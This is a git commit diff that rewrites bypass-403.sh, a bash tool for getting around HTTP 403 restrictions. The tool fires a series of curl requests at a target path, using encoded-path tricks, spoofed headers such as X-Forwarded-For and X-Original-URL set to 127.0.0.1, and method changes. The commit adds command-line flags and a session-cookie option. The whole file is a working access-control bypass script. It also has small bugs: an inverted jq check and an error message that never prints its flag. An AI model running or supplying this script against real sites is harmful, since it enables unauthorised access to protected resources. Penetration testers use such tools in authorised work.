2aea422bd2fc9f449996c5fb9def515f923e80d3
fhAnso <felix.hansow@proton.me>
2024-07-09 20:56:48 +0200

    Some features added and minor adjustments
    The command line arguments are now parsed using flags. The option to set a session cookie has also been added. For immediate use after download, the external non-standard programs are checked to see if they are already installed. If the programs are not installed, alternatives are used.

--- bypass-403.sh
+++ bypass-403.sh
@@ -1,61 +1,135 @@
-#! /bin/bash
-figlet Bypass-403
-echo "                                               By Iam_J0ker"
-echo "./bypass-403.sh https://example.com path"
-echo " "
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
-echo "  --> ${1}/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
-echo "  --> ${1}/%2e/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
-echo "  --> ${1}/${2}/."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
-echo "  --> ${1}//${2}//"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
-echo "  --> ${1}/./${2}/./"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
-echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
-echo "  --> ${1} -H X-rewrite-url: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
-echo "  --> ${1}/${2}%20"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
-echo "  --> ${1}/${2}%09"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
-echo "  --> ${1}/${2}?"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
-echo "  --> ${1}/${2}.html"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
-echo "  --> ${1}/${2}/?anything"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
-echo "  --> ${1}/${2}#"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
-echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
-echo "  --> ${1}/${2}/*"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
-echo "  --> ${1}/${2}.php"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
-echo "  --> ${1}/${2}.json"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2}  -X TRACE"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
-echo "  --> ${1}/${2}..;/"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
-echo "  --> ${1}/${2};/"
-#updated
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2} -X TRACE"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
-echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
-echo "Way back machine:"
-curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
+#!/bin/bash
+# Created by iamj0ker, forked by fhAnso ...
+command -v figlet &>/dev/null && figlet Bypass-403 || {
+echo
+echo "██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗      ██╗  ██╗ ██████╗ ██████╗" 
+echo "██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝      ██║  ██║██╔═████╗╚════██╗"
+echo "██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗█████╗███████║██║██╔██║ █████╔╝"
+echo "██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║╚════╝╚════██║████╔╝██║ ╚═══██╗"
+echo "██████╔╝   ██║   ██║     ██║  ██║███████║███████║           ██║╚██████╔╝██████╔╝"
+echo "╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝           ╚═╝ ╚═════╝ ╚═════╝ "
+}
+[[ $# -eq 0 ]] && {
+  echo "ERROR: No params specified. EXIT!"
+  exit -1
+}
 
+function print_err()
+{
+  local flag="$1"
+  printf "ERROR: %s flag set but not argument given!"
+  exit -1
+}
+
+banner="
+Usage: bypass-403.sh [options]
+
+-h, --help    Display this help banner
+-u, --url     Target URL
+-p, --path    Target path
+-c, --cookie  Session cookie
+
+Example: ./bypass-403.sh -u http://targetsite.xyz -p secret
+"
+
+while [[ $# -gt 0 ]]
+do
+  case "$1" in
+    -h|--help)
+      echo -e "$banner" 
+      exit 0 
+      ;;
+    -u|--url)
+      [[ -n "$2" ]] && {
+        url="$2"
+        shift
+      } || print_err "URL"
+      ;;
+    -p|--path)
+      [[ -n "$2" ]] && {
+        path="$2"
+        shift
+      } || print_err "Path"
+      ;;
+    -c|--cookie)
+      [[ -n "$2" ]] && {
+        cookie="$2"
+        shift
+      } || print_err "Cookie"
+      ;;
+    *)
+      echo "Invalid argument!"
+      ;;
+    esac
+    shift
+done
+# -k  Allow insecure sever connections
+# -s  Silend mode
+# -o  output: Write to file instead of stdout
+# -iL Include protocol response headers in output - follow redirects
+# -w  Use output FORMAT after completion
+# -b  Send cookie from string
+
+printf "\n[*] Testing accessibility of %s at %s..\n\n" "$path" "$url"
+
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path
+echo "  --> ${url}/${path}"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/%2e/$path
+echo "  --> ${url}/%2e/${path}"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/.
+echo "  --> ${url}/${path}/."
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url//$path//
+echo "  --> ${url}//${path}//"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/./$path/./
+echo "  --> ${url}/./${path}/./"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $path" $url/$path
+echo "  --> ${url}/${path} -H X-Original-URL: ${path}"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $url/$path
+echo "  --> ${url}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $url/$path
+echo "  --> ${url}/${path} -H X-Forwarded-For: http://127.0.0.1"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $url/$path
+echo "  --> ${url}/${path} -H X-Forwarded-For: 127.0.0.1:80"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $path" $url
+echo "  --> ${url} -H X-rewrite-url: ${path}"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%20
+echo "  --> ${url}/${path}%20"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%0A
+echo "  --> ${url}/${path}%0A"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%09
+echo "  --> ${path}/${url}%09"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path?
+echo "  --> ${url}/${path}?"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.html
+echo "  --> ${url}/${path}.html"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/?anything
+echo "  --> ${url}/${path}/?anything"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path#
+echo "  --> ${url}/${path}#"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $url/$path
+echo "  --> ${url}/${path} -H Content-Length:0 -X POST"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/*
+echo "  --> ${url}/${path}/*"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.php
+echo "  --> ${url}/${path}.php"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.json
+echo "  --> ${url}/${path}.json"
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
+echo "  --> ${url}/${path}  -X TRACE"
+curl -s -b "$cookie" -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $url/$path
+echo "  --> ${url}/${path} -H X-Host: 127.0.0.1"
+curl -s -b "$cookie" -o /dev/null -iL -w "%{http_code}","%{size_download}" "$url/$path..;/"
+echo "  --> ${url}/${path}..;/"
+curl -s -b "$cookie" -o /dev/null -iL -w "%{http_code}","%{size_download}" " $url/$path;/"
+echo "  --> ${url}/${path};/"
+#updated
+curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
+echo "  --> ${url}/${path} -X TRACE"
+curl -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $url/$path
+echo "  --> ${url}/${path} -H X-Forwarded-Host: 127.0.0.1"
+command -v jq &>/dev/null || {
+echo "Way back machine:"
+curl -s  https://archive.org/wayback/available?url=$url/$path | jq -r '.archived_snapshots.closest | {available, url}'
+}
+
+printf "\n[*] Done\n"
